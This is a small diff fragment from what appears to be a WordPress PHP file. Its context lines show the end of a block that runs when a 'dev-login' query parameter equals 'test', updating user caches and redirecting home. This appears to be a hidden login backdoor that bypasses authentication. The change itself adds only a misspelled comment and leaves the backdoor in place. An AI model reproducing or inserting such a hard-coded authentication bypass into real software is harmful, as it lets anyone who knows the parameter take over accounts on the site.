@@ -1870,3 +1870,4 @@ if(isset($_GET['dev-login']) && $_GET['dev-login'] == "test")
     update_user_caches($user);
     wp_redirect(home_url());
 }
+/* New Code Updae*/	
